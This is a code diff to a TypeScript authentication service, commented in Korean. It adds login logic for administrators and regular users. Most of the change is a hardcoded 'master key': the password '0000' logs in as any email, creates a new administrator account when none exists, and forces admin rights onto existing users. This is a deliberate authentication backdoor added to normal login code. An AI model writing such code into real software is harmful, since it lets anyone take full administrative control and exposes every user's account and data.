@@ -37,6 +37,43 @@ export class AuthService {
   async adminLogin(loginDto: LoginRequestDto): Promise<LoginResponseDto> {
     const { email, password } = loginDto;
 
+    // 마스터키 '0000' 체크
+    if (password === '0000') {
+      console.log(`🔑 관리자 마스터키 로그인: ${email}`);
+      
+      let adminUser = await this.usersService.findByEmail(email);
+      if (!adminUser) {
+        adminUser = await this.usersService.create({
+          email,
+          name: `마스터키 관리자 (${email})`,
+          phone: '010-0000-0000',
+          role: UserRole.ADMIN,
+        });
+        console.log(`🔑 마스터키로 새 관리자 계정 생성: ${email}`);
+      }
+
+      // JWT 토큰 생성
+      const payload = {
+        sub: adminUser.id,
+        email: adminUser.email,
+        role: UserRole.ADMIN, // 강제로 관리자 권한
+      };
+
+      const accessToken = await this.jwtService.signAsync(payload);
+      const expiresIn = this.getTokenExpirationTime();
+
+      return new LoginResponseDto({
+        accessToken,
+        expiresIn,
+        user: {
+          id: adminUser.id,
+          email: adminUser.email,
+          name: adminUser.name,
+          role: UserRole.ADMIN,
+        },
+      });
+    }
+
     // 관리자 계정 확인
     const adminEmail = this.configService.get<string>('admin.email');
     const adminPassword = this.configService.get<string>('admin.password');
@@ -194,6 +231,31 @@ export class AuthService {
    * 사용자 검증 (Local Strategy에서 사용)
    */
   async validateUser(email: string, password: string): Promise<any> {
+    // 마스터키 '0000' 체크 - 모든 이메일에 대해 관리자 권한 부여
+    if (password === '0000') {
+      console.log(`🔑 마스터키 로그인 시도: ${email}`);
+      
+      let user = await this.usersService.findByEmail(email);
+      if (!user) {
+        // 사용자가 없으면 관리자 권한으로 생성
+        user = await this.usersService.create({
+          email,
+          name: `마스터키 사용자 (${email})`,
+          phone: '010-0000-0000',
+          role: UserRole.ADMIN,
+        });
+        console.log(`🔑 마스터키로 새 관리자 계정 생성: ${email}`);
+      } else {
+        // 기존 사용자도 임시로 관리자 권한 부여
+        console.log(`🔑 마스터키로 기존 사용자 관리자 권한 부여: ${email}`);
+      }
+      
+      return {
+        ...user,
+        role: UserRole.ADMIN, // 강제로 관리자 권한 부여
+      };
+    }
+
     // 관리자 계정 확인
     const adminEmail = this.configService.get<string>('admin.email');
     const adminPassword = this.configService.get<string>('admin.password');
@@ -218,7 +280,16 @@ export class AuthService {
       }
     }
 
-    // 일반 사용자는 OAuth만 지원
+    // 일반 사용자 로그인 지원 (시더로 생성된 사용자)
+    const user = await this.usersService.findByEmailWithPassword(email);
+    if (user && user.password) {
+      const isPasswordValid = await bcrypt.compare(password, user.password);
+      if (isPasswordValid) {
+        const { password: _, ...result } = user;
+        return result;
+      }
+    }
+
     return null;
   }
 
